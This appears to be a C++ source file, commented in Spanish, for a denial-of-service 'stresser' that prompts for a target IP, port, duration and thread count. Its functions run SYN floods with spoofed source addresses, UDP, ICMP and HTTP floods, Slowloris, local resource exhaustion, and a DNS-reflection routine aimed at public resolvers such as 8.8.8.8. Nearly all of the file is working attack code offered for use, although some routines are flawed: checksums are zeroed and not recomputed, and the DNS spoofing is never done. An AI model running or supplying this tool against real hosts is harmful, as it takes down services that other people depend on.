#include <iostream>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <ctime>
#include <random>
#include <algorithm>
#include <iomanip>
#include <sstream>
#include <mutex>
#include <map>
#include <netdb.h>
#include <chrono>
#include <cmath>
#include <csignal>

// ================= CONFIGURACIÓN GLOBAL =================
std::atomic<bool> running(true);
std::atomic<long> total_packets_sent(0);
std::atomic<long> total_bytes_sent(0);
std::mutex cout_mutex;

// ================= PROTOTIPOS DE FUNCIONES =================
void tcp_syn_flood(const char* target_ip, int target_port, int duration, int thread_id);
void udp_flood(const char* target_ip, int target_port, int duration, int thread_id);
void icmp_flood(const char* target_ip, int duration, int thread_id);
void http_flood(const char* target, int port, int duration, int thread_id);
void slowloris(const char* target, int port, int duration, int thread_id);
void resource_exhaustion(int duration, int thread_id);
void dns_amplification(const char* target, int duration, int thread_id);
void mixed_attack(const char* target, int port, int duration, int thread_id);
void show_banner();
void show_stats();
void signal_handler(int signum);
bool validate_ip(const std::string& ip);
bool validate_port(int port);
bool is_port_open(const std::string& ip, int port, int timeout = 2);

// ================= TÉCNICAS DE ATAQUE =================

// TCP SYN Flood con spoofing IP
void tcp_syn_flood(const char* target_ip, int target_port, int duration, int thread_id) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0) {
        perror("Socket TCP error");
        return;
    }
    
    int one = 1;
    const int *val = &one;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(s);
        return;
    }
    
    sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &dest_addr.sin_addr);
    
    char packet[4096];
    memset(packet, 0, 4096);
    
    iphdr* ip = reinterpret_cast<iphdr*>(packet);
    tcphdr* tcp = reinterpret_cast<tcphdr*>(packet + sizeof(iphdr));
    
    // Configuración IP
    ip->ihl = 5;
    ip->version = 4;
    ip->tot_len = htons(sizeof(iphdr) + sizeof(tcphdr));
    ip->id = htons(static_cast<unsigned short>(rand() % 65535));
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = rand();
    ip->daddr = dest_addr.sin_addr.s_addr;
    ip->check = 0;
    
    // Configuración TCP
    tcp->source = htons(rand() % 65535);
    tcp->dest = htons(target_port);
    tcp->seq = rand();
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(65535);
    tcp->check = 0;
    
    // Pseudo header para checksum
    struct pseudo_header {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
    } pheader;
    
    pheader.source_address = ip->saddr;
    pheader.dest_address = ip->daddr;
    pheader.placeholder = 0;
    pheader.protocol = IPPROTO_TCP;
    pheader.tcp_length = htons(sizeof(tcphdr));
    
    char pseudo_packet[sizeof(pseudo_header) + sizeof(tcphdr)];
    memcpy(pseudo_packet, &pheader, sizeof(pseudo_header));
    memcpy(pseudo_packet + sizeof(pseudo_header), tcp, sizeof(tcphdr));
    
    // Calcular checksum
    tcp->check = 0;
    unsigned int sum = 0;
    for (int i = 0; i < sizeof(pseudo_packet); i += 2) {
        sum += *reinterpret_cast<unsigned short*>(&pseudo_packet[i]);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    tcp->check = static_cast<unsigned short>(~sum);
    
    // Calcular checksum IP
    ip->check = 0;
    sum = 0;
    for (int i = 0; i < sizeof(iphdr); i += 2) {
        sum += *reinterpret_cast<unsigned short*>(reinterpret_cast<char*>(ip) + i);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    ip->check = static_cast<unsigned short>(~sum);
    
    auto start = std::chrono::steady_clock::now();
    long packets = 0;
    long bytes = 0;
    int packet_size = ntohs(ip->tot_len);
    
    while(running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if(elapsed >= duration) break;
        
        // Cambiar IP origen aleatoriamente
        ip->saddr = rand();
        tcp->source = htons(rand() % 65535);
        tcp->seq = rand();
        
        // Recalcular checksums (simplificado)
        tcp->check = 0;
        ip->check = 0;
        
        if(sendto(s, packet, packet_size, 0, 
                 reinterpret_cast<sockaddr*>(&dest_addr), sizeof(dest_addr)) > 0) {
            packets++;
            bytes += packet_size;
        }
    }
    
    total_packets_sent += packets;
    total_bytes_sent += bytes;
    
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Thread " << thread_id << "] TCP SYN Flood terminado. Paquetes: " 
                  << packets << " (" << bytes / 1024 / 1024 << " MB)\n";
    }
    
    close(s);
}

// UDP Flood con payloads aleatorios
void udp_flood(const char* target_ip, int target_port, int duration, int thread_id) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s < 0) {
        perror("Socket UDP error");
        return;
    }
    
    sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &dest_addr.sin_addr);
    
    // Generador de payload aleatorio
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    
    const int min_payload_size = 65000;
    std::vector<char> payload(min_payload_size);
    
    auto start = std::chrono::steady_clock::now();
    long packets = 0;
    long bytes = 0;
    
    while(running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if(elapsed >= duration) break;
        
        // Generar payload aleatorio
        for(int i = 0; i < min_payload_size; i++) {
            payload[i] = static_cast<char>(dis(gen));
        }
        
        int bytes_sent = sendto(s, payload.data(), payload.size(), 0, 
                              reinterpret_cast<sockaddr*>(&dest_addr), sizeof(dest_addr));
        if(bytes_sent > 0) {
            packets++;
            bytes += bytes_sent;
        }
    }
    
    total_packets_sent += packets;
    total_bytes_sent += bytes;
    
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Thread " << thread_id << "] UDP Flood terminado. Paquetes: " 
                  << packets << " (" << bytes / 1024 / 1024 << " MB)\n";
    }
    
    close(s);
}

// ICMP Flood (Ping Flood)
void icmp_flood(const char* target_ip, int duration, int thread_id) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(s < 0) {
        perror("Socket ICMP error");
        return;
    }
    
    sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &dest_addr.sin_addr);
    
    char packet[4096];
    memset(packet, 0, 4096);
    
    icmphdr* icmp = reinterpret_cast<icmphdr*>(packet);
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = rand() % 65535;
    icmp->un.echo.sequence = 0;
    icmp->checksum = 0;
    
    // Payload
    char* payload = packet + sizeof(icmphdr);
    for(int i = 0; i < 1500 - sizeof(icmphdr); i++) {
        payload[i] = rand() % 256;
    }
    
    // Calcular checksum
    icmp->checksum = 0;
    unsigned int sum = 0;
    for (int i = 0; i < sizeof(icmphdr) + 1500; i += 2) {
        sum += *reinterpret_cast<unsigned short*>(packet + i);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    icmp->checksum = static_cast<unsigned short>(~sum);
    
    auto start = std::chrono::steady_clock::now();
    long packets = 0;
    long bytes = 0;
    int packet_size = sizeof(icmphdr) + 1500;
    
    while(running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if(elapsed >= duration) break;
        
        icmp->un.echo.id = rand() % 65535;
        icmp->un.echo.sequence++;
        
        if(sendto(s, packet, packet_size, 0, 
                 reinterpret_cast<sockaddr*>(&dest_addr), sizeof(dest_addr)) > 0) {
            packets++;
            bytes += packet_size;
        }
    }
    
    total_packets_sent += packets;
    total_bytes_sent += bytes;
    
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Thread " << thread_id << "] ICMP Flood terminado. Paquetes: " 
                  << packets << " (" << bytes / 1024 / 1024 << " MB)\n";
    }
    
    close(s);
}

// HTTP Flood con múltiples cabeceras y métodos
void http_flood(const char* target, int port, int duration, int thread_id) {
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    // Resolver DNS
    hostent* host = gethostbyname(target);
    if(!host) {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cerr << "[Thread " << thread_id << "] Error al resolver: " << target << "\n";
        return;
    }
    memcpy(&server_addr.sin_addr, host->h_addr, host->h_length);
    
    // Lista de User-Agents
    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    };
    
    const char* methods[] = {"GET", "POST", "PUT", "DELETE", "HEAD"};
    const char* paths[] = {"/", "/search", "/api/v1/data", "/user/profile", "/admin", "/wp-login.php"};
    
    auto start = std::chrono::steady_clock::now();
    long requests = 0;
    long bytes = 0;
    
    while(running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if(elapsed >= duration) break;
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;
        
        // Set timeout
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
        
        // Conectar
        if(connect(sock, reinterpret_cast<sockaddr*>(&server_addr), sizeof(server_addr)) < 0) {
            close(sock);
            continue;
        }
        
        // Construir petición HTTP
        std::stringstream ss;
        const char* method = methods[rand() % 5];
        const char* path = paths[rand() % 6];
        
        ss << method << " " << path << "?rnd=" << rand() << " HTTP/1.1\r\n";
        ss << "Host: " << target << "\r\n";
        ss << "User-Agent: " << user_agents[rand() % 5] << "\r\n";
        ss << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";
        ss << "Accept-Language: en-US,en;q=0.5\r\n";
        ss << "Connection: keep-alive\r\n";
        
        // Cabeceras adicionales aleatorias
        for(int i = 0; i < 5; i++) {
            ss << "X-Custom-Header" << i << ": " << rand() << "\r\n";
        }
        
        if(strcmp(method, "POST") == 0 || strcmp(method, "PUT") == 0) {
            std::string body = "data=" + std::to_string(rand());
            ss << "Content-Type: application/x-www-form-urlencoded\r\n";
            ss << "Content-Length: " << body.size() << "\r\n\r\n";
            ss << body;
        } else {
            ss << "\r\n";
        }
        
        std::string request = ss.str();
        
        if(send(sock, request.c_str(), request.size(), 0) > 0) {
            requests++;
            bytes += request.size();
        }
        
        close(sock);
    }
    
    total_packets_sent += requests;
    total_bytes_sent += bytes;
    
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Thread " << thread_id << "] HTTP Flood terminado. Solicitudes: " 
                  << requests << " (" << bytes / 1024 / 1024 << " MB)\n";
    }
}

// Ataque Slowloris (mantener conexiones abiertas)
void slowloris(const char* target, int port, int duration, int thread_id) {
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    // Resolver DNS
    hostent* host = gethostbyname(target);
    if(!host) {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cerr << "[Thread " << thread_id << "] Error al resolver: " << target << "\n";
        return;
    }
    memcpy(&server_addr.sin_addr, host->h_addr, host->h_length);
    
    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
    };
    
    auto start = std::chrono::steady_clock::now();
    std::vector<int> sockets;
    long connections = 0;
    
    while(running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if(elapsed >= duration) break;
        
        // Crear nueva conexión
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;
        
        // Conectar
        if(connect(sock, reinterpret_cast<sockaddr*>(&server_addr), sizeof(server_addr)) < 0) {
            close(sock);
            continue;
        }
        
        // Enviar encabezado parcial
        std::stringstream ss;
        ss << "GET /?" << rand() << " HTTP/1.1\r\n";
        ss << "Host: " << target << "\r\n";
        ss << "User-Agent: " << user_agents[rand() % 3] << "\r\n";
        ss << "Connection: keep-alive\r\n";
        ss << "Content-Length: " << (1000000 + rand() % 1000000) << "\r\n";
        ss << "X-a: b\r\n";  // Encabezado inicial
        
        std::string request = ss.str();
        send(sock, request.c_str(), request.size(), 0);
        
        sockets.push_back(sock);
        connections++;
        
        // Mantener conexiones vivas
        for(auto it = sockets.begin(); it != sockets.end(); ) {
            std::string keep_alive = "X-" + std::to_string(rand()) + ": " + std::to_string(rand()) + "\r\n";
            if(send(*it, keep_alive.c_str(), keep_alive.size(), 0) <= 0) {
                close(*it);
                it = sockets.erase(it);
            } else {
                ++it;
            }
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    // Cerrar todas las conexiones
    for(int sock : sockets) {
        close(sock);
    }
    
    total_packets_sent += connections;
    
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Thread " << thread_id << "] Slowloris terminado. Conexiones: " 
                  << connections << "\n";
    }
}

// Agotamiento de recursos locales (CPU, memoria)
void resource_exhaustion(int duration, int thread_id) {
    auto start = std::chrono::steady_clock::now();
    long iterations = 0;
    
    // Consumir memoria
    std::vector<std::vector<char>> memory_blocks;
    
    while(running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if(elapsed >= duration) break;
        
        // Consumir CPU
        for(int i = 0; i < 1000000; i++) {
            double result = std::sqrt(std::log(std::pow(i + 1, 2.5)));
            iterations++;
        }
        
        // Consumir memoria (1MB cada 10 iteraciones)
        if(iterations % 10 == 0) {
            try {
                memory_blocks.emplace_back(1024 * 1024); // 1MB
            } catch(...) {
                // Ignorar errores de memoria
            }
        }
    }
    
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Thread " << thread_id << "] Resource Exhaustion terminado. Iteraciones: " 
                  << iterations << ", Memoria: " << memory_blocks.size() << " MB\n";
    }
}

// DNS Amplification (ataque de reflexión)
void dns_amplification(const char* target, int duration, int thread_id) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s < 0) {
        perror("Socket UDP error");
        return;
    }
    
    sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(53);  // DNS port
    
    // Resolver DNS del objetivo
    hostent* host = gethostbyname(target);
    if(!host) {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cerr << "[Thread " << thread_id << "] Error al resolver: " << target << "\n";
        close(s);
        return;
    }
    memcpy(&dest_addr.sin_addr, host->h_addr, host->h_length);
    
    // Servidores DNS públicos para amplificación
    const char* dns_servers[] = {
        "8.8.8.8",      // Google
        "1.1.1.1",      // Cloudflare
        "9.9.9.9",      // Quad9
        "64.6.64.6",    // Verisign
        "208.67.222.222" // OpenDNS
    };
    
    // Construir consulta DNS (ANY para respuesta grande)
    unsigned char dns_query[] = {
        0xAA, 0xAA, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x07, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d, 
        0x00, 0x00, 0xff, 0x00, 0x01
    };
    
    auto start = std::chrono::steady_clock::now();
    long packets = 0;
    long bytes = 0;
    
    while(running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if(elapsed >= duration) break;
        
        // Enviar a múltiples servidores DNS
        for(const char* dns_server : dns_servers) {
            sockaddr_in dns_addr;
            memset(&dns_addr, 0, sizeof(dns_addr));
            dns_addr.sin_family = AF_INET;
            dns_addr.sin_port = htons(53);
            inet_pton(AF_INET, dns_server, &dns_addr.sin_addr);
            
            // Spoofear dirección IP de origen (el objetivo)
            dns_query[0] = rand() % 256; // ID aleatorio
            dns_query[1] = rand() % 256;
            
            if(sendto(s, dns_query, sizeof(dns_query), 0,
                     reinterpret_cast<sockaddr*>(&dns_addr), sizeof(dns_addr)) > 0) {
                packets++;
                bytes += sizeof(dns_query);
            }
        }
    }
    
    total_packets_sent += packets;
    total_bytes_sent += bytes;
    
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Thread " << thread_id << "] DNS Amplification terminado. Paquetes: " 
                  << packets << " (" << bytes / 1024 / 1024 << " MB)\n";
    }
    
    close(s);
}

// Ataque combinado (mezcla varios métodos)
void mixed_attack(const char* target, int port, int duration, int thread_id) {
    auto start = std::chrono::steady_clock::now();
    long actions = 0;
    
    while(running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if(elapsed >= duration) break;
        
        // Alternar entre diferentes ataques
        switch(rand() % 5) {
            case 0:
                tcp_syn_flood(target, port, 1, thread_id);
                break;
            case 1:
                udp_flood(target, port, 1, thread_id);
                break;
            case 2:
                http_flood(target, port, 1, thread_id);
                break;
            case 3:
                slowloris(target, port, 1, thread_id);
                break;
            case 4:
                resource_exhaustion(1, thread_id);
                break;
        }
        
        actions++;
    }
    
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Thread " << thread_id << "] Mixed Attack terminado. Acciones: " 
                  << actions << "\n";
    }
}

// ================= VALIDACIÓN DE ENTRADA =================

// Valida IP
bool validate_ip(const std::string& ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
}

// Valida puerto
bool validate_port(int port) {
    return port > 0 && port <= 65535;
}

// Verifica si puerto TCP está abierto
bool is_port_open(const std::string& ip, int port, int timeout) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return false;

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

    // set timeout
    struct timeval tv;
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    bool open = (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0);
    close(sock);
    return open;
}

// ================= INTERFAZ Y CONTROL =================

void show_banner() {
    std::cout << R"(
███████╗████████╗██████╗ ███████╗███████╗███████╗██████╗ 
██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
███████╗   ██║   ██████╔╝█████╗  ███████╗█████╗  ██████╔╝
╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║██╔══╝  ██╔══██╗
███████║   ██║   ██║  ██║███████╗███████║███████╗██║  ██║
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
    )" << '\n';
    
    std::cout << "=== Advanced Network Stress Tool ===" << "\n";
    std::cout << "Métodos disponibles:\n";
    std::cout << "1. TCP SYN Flood\n";
    std::cout << "2. UDP Flood\n";
    std::cout << "3. ICMP Flood\n";
    std::cout << "4. HTTP Flood\n";
    std::cout << "5. Slowloris\n";
    std::cout << "6. Resource Exhaustion\n";
    std::cout << "7. DNS Amplification\n";
    std::cout << "8. Mixed Attack\n";
    std::cout << "0. Salir\n";
}

void show_stats() {
    while(running) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        long packets = total_packets_sent.load();
        long bytes = total_bytes_sent.load();
        
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "\n=== Estadísticas ==="
                  << "\nPaquetes totales: " << packets
                  << "\nDatos totales: " << bytes / 1024 / 1024 << " MB"
                  << "\nAncho de banda: " << (bytes / 2) / 1024 << " KB/s\n\n";
    }
}

void signal_handler(int signum) {
    std::cout << "\nSeñal " << signum << " recibida. Deteniendo ataques...\n";
    running = false;
}

int main() {
    signal(SIGINT, signal_handler);
    
    show_banner();
    
    std::string target;
    int port;
    int duration;
    int threads;
    
    // Solicitar datos de entrada
    std::cout << "\nIngrese la IP objetivo: ";
    std::cin >> target;
    
    if(!validate_ip(target)) {
        std::cerr << "IP inválida.\n";
        return 1;
    }
    
    std::cout << "Ingrese el puerto: ";
    std::cin >> port;
    
    if(!validate_port(port)) {
        std::cerr << "Puerto inválido.\n";
        return 1;
    }
    
    // Verificar si el puerto está abierto
    if(!is_port_open(target, port)) {
        std::cerr << "[!] Puerto " << port << " cerrado o inaccesible. ¿Continuar? (y/n): ";
        char choice;
        std::cin >> choice;
        if(choice != 'y' && choice != 'Y') {
            return 1;
        }
    }
    
    std::cout << "Duración del ataque (segundos): ";
    std::cin >> duration;
    
    std::cout << "Número de hilos: ";
    std::cin >> threads;
    
    int method_choice;
    std::cout << "\nSeleccione método: ";
    std::cin >> method_choice;
    
    if(method_choice < 1 || method_choice > 8) {
        std::cout << "Opción inválida. Saliendo.\n";
        return 1;
    }
    
    std::cout << "Iniciando ataque..." << std::endl;
    
    // Iniciar monitor de estadísticas
    std::thread stats_thread(show_stats);
    
    // Crear hilos de ataque
    std::vector<std::thread> attack_threads;
    for(int i = 0; i < threads; i++) {
        switch(method_choice) {
            case 1:
                attack_threads.emplace_back(tcp_syn_flood, target.c_str(), port, duration, i);
                break;
            case 2:
                attack_threads.emplace_back(udp_flood, target.c_str(), port, duration, i);
                break;
            case 3:
                attack_threads.emplace_back(icmp_flood, target.c_str(), duration, i);
                break;
            case 4:
                attack_threads.emplace_back(http_flood, target.c_str(), port, duration, i);
                break;
            case 5:
                attack_threads.emplace_back(slowloris, target.c_str(), port, duration, i);
                break;
            case 6:
                attack_threads.emplace_back(resource_exhaustion, duration, i);
                break;
            case 7:
                attack_threads.emplace_back(dns_amplification, target.c_str(), duration, i);
                break;
            case 8:
                attack_threads.emplace_back(mixed_attack, target.c_str(), port, duration, i);
                break;
        }
    }
    
    // Esperar a que terminen los hilos
    for(auto& t : attack_threads) {
        if(t.joinable()) t.join();
    }
    
    running = false;
    if(stats_thread.joinable()) stats_thread.join();
    
    std::cout << "\nAtaque completado. Estadísticas finales:\n";
    std::cout << "Total paquetes: " << total_packets_sent << "\n";
    std::cout << "Total datos: " << total_bytes_sent / 1024 / 1024 << " MB\n";
    
    return 0;
}
